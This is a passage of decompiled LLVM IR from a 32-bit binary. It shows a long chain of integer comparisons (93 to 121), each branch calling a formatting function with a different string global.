  store i32 %v1_804af64, i32* @edx, align 4
  %v0_804af70 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804af70 = zext i8 %v0_804af70 to i32
  %v2_804af7f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af7f, i32* @ebx, align 4
  %v5_804af86 = call i32 @function_8048b5b(i32 %v2_804af7f, i32 ptrtoint ([13 x i8]* @global_var_805a3d2.135 to i32), i32 %v1_804af70, i32 %v1_804af64)
  br label %dec_label_pc_804af8e

dec_label_pc_804af8e:                             ; preds = %dec_label_pc_804af5e, %dec_label_pc_804af64
  %v12_804af8e = icmp eq i32 %v11_8049e19, 93
  %v1_804af92 = icmp eq i1 %v12_804af8e, false
  br i1 %v1_804af92, label %dec_label_pc_804afbe, label %dec_label_pc_804af94

dec_label_pc_804af94:                             ; preds = %dec_label_pc_804af8e
  %v0_804af94 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804af94 = zext i8 %v0_804af94 to i32
  store i32 %v1_804af94, i32* @edx, align 4
  %v0_804afa0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804afa0 = zext i8 %v0_804afa0 to i32
  %v2_804afaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afaf, i32* @ebx, align 4
  %v5_804afb6 = call i32 @function_8048b5b(i32 %v2_804afaf, i32 ptrtoint ([12 x i8]* @global_var_805a3df.136 to i32), i32 %v1_804afa0, i32 %v1_804af94)
  br label %dec_label_pc_804afbe

dec_label_pc_804afbe:                             ; preds = %dec_label_pc_804af8e, %dec_label_pc_804af94
  %v12_804afbe = icmp eq i32 %v11_8049e19, 94
  %v1_804afc2 = icmp eq i1 %v12_804afbe, false
  br i1 %v1_804afc2, label %dec_label_pc_804afee, label %dec_label_pc_804afc4

dec_label_pc_804afc4:                             ; preds = %dec_label_pc_804afbe
  %v0_804afc4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804afc4 = zext i8 %v0_804afc4 to i32
  store i32 %v1_804afc4, i32* @edx, align 4
  %v0_804afd0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804afd0 = zext i8 %v0_804afd0 to i32
  %v2_804afdf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afdf, i32* @ebx, align 4
  %v5_804afe6 = call i32 @function_8048b5b(i32 %v2_804afdf, i32 ptrtoint ([13 x i8]* @global_var_805a3eb.137 to i32), i32 %v1_804afd0, i32 %v1_804afc4)
  br label %dec_label_pc_804afee

dec_label_pc_804afee:                             ; preds = %dec_label_pc_804afbe, %dec_label_pc_804afc4
  %v12_804afee = icmp eq i32 %v11_8049e19, 95
  %v1_804aff2 = icmp eq i1 %v12_804afee, false
  br i1 %v1_804aff2, label %dec_label_pc_804b01e, label %dec_label_pc_804aff4

dec_label_pc_804aff4:                             ; preds = %dec_label_pc_804afee
  %v0_804aff4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804aff4 = zext i8 %v0_804aff4 to i32
  store i32 %v1_804aff4, i32* @edx, align 4
  %v0_804b000 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b000 = zext i8 %v0_804b000 to i32
  %v2_804b00f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b00f, i32* @ebx, align 4
  %v5_804b016 = call i32 @function_8048b5b(i32 %v2_804b00f, i32 ptrtoint ([12 x i8]* @global_var_805a3f8.138 to i32), i32 %v1_804b000, i32 %v1_804aff4)
  br label %dec_label_pc_804b01e

dec_label_pc_804b01e:                             ; preds = %dec_label_pc_804afee, %dec_label_pc_804aff4
  %v9_804b01e = icmp eq i32 %v11_8049e19, 96
  %v1_804b022 = icmp eq i1 %v9_804b01e, false
  br i1 %v1_804b022, label %dec_label_pc_804b04e, label %dec_label_pc_804b024

dec_label_pc_804b024:                             ; preds = %dec_label_pc_804b01e
  %v0_804b024 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b024 = zext i8 %v0_804b024 to i32
  store i32 %v1_804b024, i32* @edx, align 4
  %v0_804b030 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b030 = zext i8 %v0_804b030 to i32
  %v2_804b03f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b03f, i32* @ebx, align 4
  %v5_804b046 = call i32 @function_8048b5b(i32 %v2_804b03f, i32 ptrtoint ([11 x i8]* @global_var_805a404.139 to i32), i32 %v1_804b030, i32 %v1_804b024)
  br label %dec_label_pc_804b04e

dec_label_pc_804b04e:                             ; preds = %dec_label_pc_804b01e, %dec_label_pc_804b024
  %v12_804b04e = icmp eq i32 %v11_8049e19, 97
  %v1_804b052 = icmp eq i1 %v12_804b04e, false
  br i1 %v1_804b052, label %dec_label_pc_804b07e, label %dec_label_pc_804b054

dec_label_pc_804b054:                             ; preds = %dec_label_pc_804b04e
  %v0_804b054 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b054 = zext i8 %v0_804b054 to i32
  store i32 %v1_804b054, i32* @edx, align 4
  %v0_804b060 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b060 = zext i8 %v0_804b060 to i32
  %v2_804b06f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b06f, i32* @ebx, align 4
  %v5_804b076 = call i32 @function_8048b5b(i32 %v2_804b06f, i32 ptrtoint ([12 x i8]* @global_var_805a40f.140 to i32), i32 %v1_804b060, i32 %v1_804b054)
  br label %dec_label_pc_804b07e

dec_label_pc_804b07e:                             ; preds = %dec_label_pc_804b04e, %dec_label_pc_804b054
  %v12_804b07e = icmp eq i32 %v11_8049e19, 98
  %v1_804b082 = icmp eq i1 %v12_804b07e, false
  br i1 %v1_804b082, label %dec_label_pc_804b0ae, label %dec_label_pc_804b084

dec_label_pc_804b084:                             ; preds = %dec_label_pc_804b07e
  %v0_804b084 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b084 = zext i8 %v0_804b084 to i32
  store i32 %v1_804b084, i32* @edx, align 4
  %v0_804b090 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b090 = zext i8 %v0_804b090 to i32
  %v2_804b09f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b09f, i32* @ebx, align 4
  %v5_804b0a6 = call i32 @function_8048b5b(i32 %v2_804b09f, i32 ptrtoint ([12 x i8]* @global_var_805a41b.141 to i32), i32 %v1_804b090, i32 %v1_804b084)
  br label %dec_label_pc_804b0ae

dec_label_pc_804b0ae:                             ; preds = %dec_label_pc_804b07e, %dec_label_pc_804b084
  %v12_804b0ae = icmp eq i32 %v11_8049e19, 99
  %v1_804b0b2 = icmp eq i1 %v12_804b0ae, false
  br i1 %v1_804b0b2, label %dec_label_pc_804b0de, label %dec_label_pc_804b0b4

dec_label_pc_804b0b4:                             ; preds = %dec_label_pc_804b0ae
  %v0_804b0b4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b0b4 = zext i8 %v0_804b0b4 to i32
  store i32 %v1_804b0b4, i32* @edx, align 4
  %v0_804b0c0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b0c0 = zext i8 %v0_804b0c0 to i32
  %v2_804b0cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0cf, i32* @ebx, align 4
  %v5_804b0d6 = call i32 @function_8048b5b(i32 %v2_804b0cf, i32 ptrtoint ([12 x i8]* @global_var_805a427.142 to i32), i32 %v1_804b0c0, i32 %v1_804b0b4)
  br label %dec_label_pc_804b0de

dec_label_pc_804b0de:                             ; preds = %dec_label_pc_804b0ae, %dec_label_pc_804b0b4
  %v12_804b0de = icmp eq i32 %v11_8049e19, 100
  %v1_804b0e2 = icmp eq i1 %v12_804b0de, false
  br i1 %v1_804b0e2, label %dec_label_pc_804b10e, label %dec_label_pc_804b0e4

dec_label_pc_804b0e4:                             ; preds = %dec_label_pc_804b0de
  %v0_804b0e4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b0e4 = zext i8 %v0_804b0e4 to i32
  store i32 %v1_804b0e4, i32* @edx, align 4
  %v0_804b0f0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b0f0 = zext i8 %v0_804b0f0 to i32
  %v2_804b0ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0ff, i32* @ebx, align 4
  %v5_804b106 = call i32 @function_8048b5b(i32 %v2_804b0ff, i32 ptrtoint ([12 x i8]* @global_var_805a433.143 to i32), i32 %v1_804b0f0, i32 %v1_804b0e4)
  br label %dec_label_pc_804b10e

dec_label_pc_804b10e:                             ; preds = %dec_label_pc_804b0de, %dec_label_pc_804b0e4
  %v12_804b10e = icmp eq i32 %v11_8049e19, 101
  %v1_804b112 = icmp eq i1 %v12_804b10e, false
  br i1 %v1_804b112, label %dec_label_pc_804b13e, label %dec_label_pc_804b114

dec_label_pc_804b114:                             ; preds = %dec_label_pc_804b10e
  %v0_804b114 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b114 = zext i8 %v0_804b114 to i32
  store i32 %v1_804b114, i32* @edx, align 4
  %v0_804b120 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b120 = zext i8 %v0_804b120 to i32
  %v2_804b12f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b12f, i32* @ebx, align 4
  %v5_804b136 = call i32 @function_8048b5b(i32 %v2_804b12f, i32 ptrtoint ([12 x i8]* @global_var_805a43f.144 to i32), i32 %v1_804b120, i32 %v1_804b114)
  br label %dec_label_pc_804b13e

dec_label_pc_804b13e:                             ; preds = %dec_label_pc_804b10e, %dec_label_pc_804b114
  %v12_804b13e = icmp eq i32 %v11_8049e19, 102
  %v1_804b142 = icmp eq i1 %v12_804b13e, false
  br i1 %v1_804b142, label %dec_label_pc_804b16e, label %dec_label_pc_804b144

dec_label_pc_804b144:                             ; preds = %dec_label_pc_804b13e
  %v0_804b144 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b144 = zext i8 %v0_804b144 to i32
  store i32 %v1_804b144, i32* @edx, align 4
  %v0_804b150 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b150 = zext i8 %v0_804b150 to i32
  %v2_804b15f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b15f, i32* @ebx, align 4
  %v5_804b166 = call i32 @function_8048b5b(i32 %v2_804b15f, i32 ptrtoint ([13 x i8]* @global_var_805a44b.145 to i32), i32 %v1_804b150, i32 %v1_804b144)
  br label %dec_label_pc_804b16e

dec_label_pc_804b16e:                             ; preds = %dec_label_pc_804b13e, %dec_label_pc_804b144
  %v12_804b16e = icmp eq i32 %v11_8049e19, 103
  %v1_804b172 = icmp eq i1 %v12_804b16e, false
  br i1 %v1_804b172, label %dec_label_pc_804b19e, label %dec_label_pc_804b174

dec_label_pc_804b174:                             ; preds = %dec_label_pc_804b16e
  %v0_804b174 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b174 = zext i8 %v0_804b174 to i32
  store i32 %v1_804b174, i32* @edx, align 4
  %v0_804b180 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b180 = zext i8 %v0_804b180 to i32
  %v2_804b18f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b18f, i32* @ebx, align 4
  %v5_804b196 = call i32 @function_8048b5b(i32 %v2_804b18f, i32 ptrtoint ([13 x i8]* @global_var_805a458.146 to i32), i32 %v1_804b180, i32 %v1_804b174)
  br label %dec_label_pc_804b19e

dec_label_pc_804b19e:                             ; preds = %dec_label_pc_804b16e, %dec_label_pc_804b174
  %v12_804b19e = icmp eq i32 %v11_8049e19, 104
  %v1_804b1a2 = icmp eq i1 %v12_804b19e, false
  br i1 %v1_804b1a2, label %dec_label_pc_804b1ce, label %dec_label_pc_804b1a4

dec_label_pc_804b1a4:                             ; preds = %dec_label_pc_804b19e
  %v0_804b1a4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b1a4 = zext i8 %v0_804b1a4 to i32
  store i32 %v1_804b1a4, i32* @edx, align 4
  %v0_804b1b0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b1b0 = zext i8 %v0_804b1b0 to i32
  %v2_804b1bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1bf, i32* @ebx, align 4
  %v5_804b1c6 = call i32 @function_8048b5b(i32 %v2_804b1bf, i32 ptrtoint ([13 x i8]* @global_var_805a465.147 to i32), i32 %v1_804b1b0, i32 %v1_804b1a4)
  br label %dec_label_pc_804b1ce

dec_label_pc_804b1ce:                             ; preds = %dec_label_pc_804b19e, %dec_label_pc_804b1a4
  %v12_804b1ce = icmp eq i32 %v11_8049e19, 105
  %v1_804b1d2 = icmp eq i1 %v12_804b1ce, false
  br i1 %v1_804b1d2, label %dec_label_pc_804b1fe, label %dec_label_pc_804b1d4

dec_label_pc_804b1d4:                             ; preds = %dec_label_pc_804b1ce
  %v0_804b1d4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b1d4 = zext i8 %v0_804b1d4 to i32
  store i32 %v1_804b1d4, i32* @edx, align 4
  %v0_804b1e0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b1e0 = zext i8 %v0_804b1e0 to i32
  %v2_804b1ef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1ef, i32* @ebx, align 4
  %v5_804b1f6 = call i32 @function_8048b5b(i32 %v2_804b1ef, i32 ptrtoint ([13 x i8]* @global_var_805a472.148 to i32), i32 %v1_804b1e0, i32 %v1_804b1d4)
  br label %dec_label_pc_804b1fe

dec_label_pc_804b1fe:                             ; preds = %dec_label_pc_804b1ce, %dec_label_pc_804b1d4
  %v12_804b1fe = icmp eq i32 %v11_8049e19, 106
  %v1_804b202 = icmp eq i1 %v12_804b1fe, false
  br i1 %v1_804b202, label %dec_label_pc_804b22e, label %dec_label_pc_804b204

dec_label_pc_804b204:                             ; preds = %dec_label_pc_804b1fe
  %v0_804b204 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b204 = zext i8 %v0_804b204 to i32
  store i32 %v1_804b204, i32* @edx, align 4
  %v0_804b210 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b210 = zext i8 %v0_804b210 to i32
  %v2_804b21f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b21f, i32* @ebx, align 4
  %v5_804b226 = call i32 @function_8048b5b(i32 %v2_804b21f, i32 ptrtoint ([13 x i8]* @global_var_805a47f.149 to i32), i32 %v1_804b210, i32 %v1_804b204)
  br label %dec_label_pc_804b22e

dec_label_pc_804b22e:                             ; preds = %dec_label_pc_804b1fe, %dec_label_pc_804b204
  %v12_804b22e = icmp eq i32 %v11_8049e19, 107
  %v1_804b232 = icmp eq i1 %v12_804b22e, false
  br i1 %v1_804b232, label %dec_label_pc_804b25e, label %dec_label_pc_804b234

dec_label_pc_804b234:                             ; preds = %dec_label_pc_804b22e
  %v0_804b234 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b234 = zext i8 %v0_804b234 to i32
  store i32 %v1_804b234, i32* @edx, align 4
  %v0_804b240 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b240 = zext i8 %v0_804b240 to i32
  %v2_804b24f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b24f, i32* @ebx, align 4
  %v5_804b256 = call i32 @function_8048b5b(i32 %v2_804b24f, i32 ptrtoint ([13 x i8]* @global_var_805a48c.150 to i32), i32 %v1_804b240, i32 %v1_804b234)
  br label %dec_label_pc_804b25e

dec_label_pc_804b25e:                             ; preds = %dec_label_pc_804b22e, %dec_label_pc_804b234
  %v12_804b25e = icmp eq i32 %v11_8049e19, 108
  %v1_804b262 = icmp eq i1 %v12_804b25e, false
  br i1 %v1_804b262, label %dec_label_pc_804b28e, label %dec_label_pc_804b264

dec_label_pc_804b264:                             ; preds = %dec_label_pc_804b25e
  %v0_804b264 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b264 = zext i8 %v0_804b264 to i32
  store i32 %v1_804b264, i32* @edx, align 4
  %v0_804b270 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b270 = zext i8 %v0_804b270 to i32
  %v2_804b27f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b27f, i32* @ebx, align 4
  %v5_804b286 = call i32 @function_8048b5b(i32 %v2_804b27f, i32 ptrtoint ([13 x i8]* @global_var_805a499.151 to i32), i32 %v1_804b270, i32 %v1_804b264)
  br label %dec_label_pc_804b28e

dec_label_pc_804b28e:                             ; preds = %dec_label_pc_804b25e, %dec_label_pc_804b264
  %v12_804b28e = icmp eq i32 %v11_8049e19, 109
  %v1_804b292 = icmp eq i1 %v12_804b28e, false
  br i1 %v1_804b292, label %dec_label_pc_804b2be, label %dec_label_pc_804b294

dec_label_pc_804b294:                             ; preds = %dec_label_pc_804b28e
  %v0_804b294 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b294 = zext i8 %v0_804b294 to i32
  store i32 %v1_804b294, i32* @edx, align 4
  %v0_804b2a0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b2a0 = zext i8 %v0_804b2a0 to i32
  %v2_804b2af = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2af, i32* @ebx, align 4
  %v5_804b2b6 = call i32 @function_8048b5b(i32 %v2_804b2af, i32 ptrtoint ([13 x i8]* @global_var_805a4a6.152 to i32), i32 %v1_804b2a0, i32 %v1_804b294)
  br label %dec_label_pc_804b2be

dec_label_pc_804b2be:                             ; preds = %dec_label_pc_804b28e, %dec_label_pc_804b294
  %v12_804b2be = icmp eq i32 %v11_8049e19, 110
  %v1_804b2c2 = icmp eq i1 %v12_804b2be, false
  br i1 %v1_804b2c2, label %dec_label_pc_804b2ee, label %dec_label_pc_804b2c4

dec_label_pc_804b2c4:                             ; preds = %dec_label_pc_804b2be
  %v0_804b2c4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b2c4 = zext i8 %v0_804b2c4 to i32
  store i32 %v1_804b2c4, i32* @edx, align 4
  %v0_804b2d0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b2d0 = zext i8 %v0_804b2d0 to i32
  %v2_804b2df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2df, i32* @ebx, align 4
  %v5_804b2e6 = call i32 @function_8048b5b(i32 %v2_804b2df, i32 ptrtoint ([12 x i8]* @global_var_805a4b3.153 to i32), i32 %v1_804b2d0, i32 %v1_804b2c4)
  br label %dec_label_pc_804b2ee

dec_label_pc_804b2ee:                             ; preds = %dec_label_pc_804b2be, %dec_label_pc_804b2c4
  %v12_804b2ee = icmp eq i32 %v11_8049e19, 111
  %v1_804b2f2 = icmp eq i1 %v12_804b2ee, false
  br i1 %v1_804b2f2, label %dec_label_pc_804b31e, label %dec_label_pc_804b2f4

dec_label_pc_804b2f4:                             ; preds = %dec_label_pc_804b2ee
  %v0_804b2f4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b2f4 = zext i8 %v0_804b2f4 to i32
  store i32 %v1_804b2f4, i32* @edx, align 4
  %v0_804b300 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b300 = zext i8 %v0_804b300 to i32
  %v2_804b30f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b30f, i32* @ebx, align 4
  %v5_804b316 = call i32 @function_8048b5b(i32 %v2_804b30f, i32 ptrtoint ([12 x i8]* @global_var_805a4bf.154 to i32), i32 %v1_804b300, i32 %v1_804b2f4)
  br label %dec_label_pc_804b31e

dec_label_pc_804b31e:                             ; preds = %dec_label_pc_804b2ee, %dec_label_pc_804b2f4
  %v9_804b31e = icmp eq i32 %v11_8049e19, 112
  %v1_804b322 = icmp eq i1 %v9_804b31e, false
  br i1 %v1_804b322, label %dec_label_pc_804b34e, label %dec_label_pc_804b324

dec_label_pc_804b324:                             ; preds = %dec_label_pc_804b31e
  %v0_804b324 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b324 = zext i8 %v0_804b324 to i32
  store i32 %v1_804b324, i32* @edx, align 4
  %v0_804b330 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b330 = zext i8 %v0_804b330 to i32
  %v2_804b33f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b33f, i32* @ebx, align 4
  %v5_804b346 = call i32 @function_8048b5b(i32 %v2_804b33f, i32 ptrtoint ([12 x i8]* @global_var_805a4cb.155 to i32), i32 %v1_804b330, i32 %v1_804b324)
  br label %dec_label_pc_804b34e

dec_label_pc_804b34e:                             ; preds = %dec_label_pc_804b31e, %dec_label_pc_804b324
  %v12_804b34e = icmp eq i32 %v11_8049e19, 113
  %v1_804b352 = icmp eq i1 %v12_804b34e, false
  br i1 %v1_804b352, label %dec_label_pc_804b37e, label %dec_label_pc_804b354

dec_label_pc_804b354:                             ; preds = %dec_label_pc_804b34e
  %v0_804b354 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b354 = zext i8 %v0_804b354 to i32
  store i32 %v1_804b354, i32* @edx, align 4
  %v0_804b360 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b360 = zext i8 %v0_804b360 to i32
  %v2_804b36f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b36f, i32* @ebx, align 4
  %v5_804b376 = call i32 @function_8048b5b(i32 %v2_804b36f, i32 ptrtoint ([13 x i8]* @global_var_805a4d7.156 to i32), i32 %v1_804b360, i32 %v1_804b354)
  br label %dec_label_pc_804b37e

dec_label_pc_804b37e:                             ; preds = %dec_label_pc_804b34e, %dec_label_pc_804b354
  %v12_804b37e = icmp eq i32 %v11_8049e19, 114
  %v1_804b382 = icmp eq i1 %v12_804b37e, false
  br i1 %v1_804b382, label %dec_label_pc_804b3ae, label %dec_label_pc_804b384

dec_label_pc_804b384:                             ; preds = %dec_label_pc_804b37e
  %v0_804b384 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b384 = zext i8 %v0_804b384 to i32
  store i32 %v1_804b384, i32* @edx, align 4
  %v0_804b390 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b390 = zext i8 %v0_804b390 to i32
  %v2_804b39f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b39f, i32* @ebx, align 4
  %v5_804b3a6 = call i32 @function_8048b5b(i32 %v2_804b39f, i32 ptrtoint ([13 x i8]* @global_var_805a4e4.157 to i32), i32 %v1_804b390, i32 %v1_804b384)
  br label %dec_label_pc_804b3ae

dec_label_pc_804b3ae:                             ; preds = %dec_label_pc_804b37e, %dec_label_pc_804b384
  %v12_804b3ae = icmp eq i32 %v11_8049e19, 115
  %v1_804b3b2 = icmp eq i1 %v12_804b3ae, false
  br i1 %v1_804b3b2, label %dec_label_pc_804b3de, label %dec_label_pc_804b3b4

dec_label_pc_804b3b4:                             ; preds = %dec_label_pc_804b3ae
  %v0_804b3b4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b3b4 = zext i8 %v0_804b3b4 to i32
  store i32 %v1_804b3b4, i32* @edx, align 4
  %v0_804b3c0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b3c0 = zext i8 %v0_804b3c0 to i32
  %v2_804b3cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3cf, i32* @ebx, align 4
  %v5_804b3d6 = call i32 @function_8048b5b(i32 %v2_804b3cf, i32 ptrtoint ([14 x i8]* @global_var_805a4f1.158 to i32), i32 %v1_804b3c0, i32 %v1_804b3b4)
  br label %dec_label_pc_804b3de

dec_label_pc_804b3de:                             ; preds = %dec_label_pc_804b3ae, %dec_label_pc_804b3b4
  %v12_804b3de = icmp eq i32 %v11_8049e19, 116
  %v1_804b3e2 = icmp eq i1 %v12_804b3de, false
  br i1 %v1_804b3e2, label %dec_label_pc_804b40e, label %dec_label_pc_804b3e4

dec_label_pc_804b3e4:                             ; preds = %dec_label_pc_804b3de
  %v0_804b3e4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b3e4 = zext i8 %v0_804b3e4 to i32
  store i32 %v1_804b3e4, i32* @edx, align 4
  %v0_804b3f0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b3f0 = zext i8 %v0_804b3f0 to i32
  %v2_804b3ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3ff, i32* @ebx, align 4
  %v5_804b406 = call i32 @function_8048b5b(i32 %v2_804b3ff, i32 ptrtoint ([13 x i8]* @global_var_805a4ff.159 to i32), i32 %v1_804b3f0, i32 %v1_804b3e4)
  br label %dec_label_pc_804b40e

dec_label_pc_804b40e:                             ; preds = %dec_label_pc_804b3de, %dec_label_pc_804b3e4
  %v12_804b40e = icmp eq i32 %v11_8049e19, 117
  %v1_804b412 = icmp eq i1 %v12_804b40e, false
  br i1 %v1_804b412, label %dec_label_pc_804b43e, label %dec_label_pc_804b414

dec_label_pc_804b414:                             ; preds = %dec_label_pc_804b40e
  %v0_804b414 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b414 = zext i8 %v0_804b414 to i32
  store i32 %v1_804b414, i32* @edx, align 4
  %v0_804b420 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b420 = zext i8 %v0_804b420 to i32
  %v2_804b42f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b42f, i32* @ebx, align 4
  %v5_804b436 = call i32 @function_8048b5b(i32 %v2_804b42f, i32 ptrtoint ([14 x i8]* @global_var_805a50c.160 to i32), i32 %v1_804b420, i32 %v1_804b414)
  br label %dec_label_pc_804b43e

dec_label_pc_804b43e:                             ; preds = %dec_label_pc_804b40e, %dec_label_pc_804b414
  %v12_804b43e = icmp eq i32 %v11_8049e19, 118
  %v1_804b442 = icmp eq i1 %v12_804b43e, false
  br i1 %v1_804b442, label %dec_label_pc_804b46e, label %dec_label_pc_804b444

dec_label_pc_804b444:                             ; preds = %dec_label_pc_804b43e
  %v0_804b444 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b444 = zext i8 %v0_804b444 to i32
  store i32 %v1_804b444, i32* @edx, align 4
  %v0_804b450 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b450 = zext i8 %v0_804b450 to i32
  %v2_804b45f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b45f, i32* @ebx, align 4
  %v5_804b466 = call i32 @function_8048b5b(i32 %v2_804b45f, i32 ptrtoint ([14 x i8]* @global_var_805a51a.161 to i32), i32 %v1_804b450, i32 %v1_804b444)
  br label %dec_label_pc_804b46e

dec_label_pc_804b46e:                             ; preds = %dec_label_pc_804b43e, %dec_label_pc_804b444
  %v12_804b46e = icmp eq i32 %v11_8049e19, 119
  %v1_804b472 = icmp eq i1 %v12_804b46e, false
  br i1 %v1_804b472, label %dec_label_pc_804b49e, label %dec_label_pc_804b474

dec_label_pc_804b474:                             ; preds = %dec_label_pc_804b46e
  %v0_804b474 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b474 = zext i8 %v0_804b474 to i32
  store i32 %v1_804b474, i32* @edx, align 4
  %v0_804b480 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b480 = zext i8 %v0_804b480 to i32
  %v2_804b48f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b48f, i32* @ebx, align 4
  %v5_804b496 = call i32 @function_8048b5b(i32 %v2_804b48f, i32 ptrtoint ([13 x i8]* @global_var_805a528.162 to i32), i32 %v1_804b480, i32 %v1_804b474)
  br label %dec_label_pc_804b49e

dec_label_pc_804b49e:                             ; preds = %dec_label_pc_804b46e, %dec_label_pc_804b474
  %v12_804b49e = icmp eq i32 %v11_8049e19, 120
  %v1_804b4a2 = icmp eq i1 %v12_804b49e, false
  br i1 %v1_804b4a2, label %dec_label_pc_804b4ce, label %dec_label_pc_804b4a4

dec_label_pc_804b4a4:                             ; preds = %dec_label_pc_804b49e
  %v0_804b4a4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b4a4 = zext i8 %v0_804b4a4 to i32
  store i32 %v1_804b4a4, i32* @edx, align 4
  %v0_804b4b0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b4b0 = zext i8 %v0_804b4b0 to i32
  %v2_804b4bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4bf, i32* @ebx, align 4
  %v5_804b4c6 = call i32 @function_8048b5b(i32 %v2_804b4bf, i32 ptrtoint ([13 x i8]* @global_var_805a535.163 to i32), i32 %v1_804b4b0, i32 %v1_804b4a4)
  br label %dec_label_pc_804b4ce

dec_label_pc_804b4ce:                             ; preds = %dec_label_pc_804b49e, %dec_label_pc_804b4a4
  %v12_804b4ce = icmp eq i32 %v11_8049e19, 121
  %v1_804b4d2 = icmp eq i1 %v12_804b4ce, false
  br i1 %v1_804b4d2, label %dec_label_pc_804b4fe, label %dec_label_pc_804b4d4

dec_label_pc_804b4d4:                             ; preds = %dec_label_pc_804b4ce
  %v0_804b4d4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b4d4 = zext i8 %v0_804b4d4 to i32
  store i32 %v1_804b4d4, i32* @edx, align 4
  %v0_804b4e0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b4e0 = zext i8 %v0_804b4e0 to i32
  %v2_804b4ef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4ef, i32* @ebx, align 4
  %v5_804b4f6 = call i32 @function_8048b5b(i32 %v2_804b4ef, i32 ptrtoint ([13 x i8]* @global_var_805a542.164 to i32), i32 %v1_804b4e0, i32 %v1_804b4d4)
  br label %dec_label_pc_804b4fe

dec_label_pc_804b4fe:                             ; preds = %dec_label_pc_804b4ce, %dec_label_pc_804b4d4
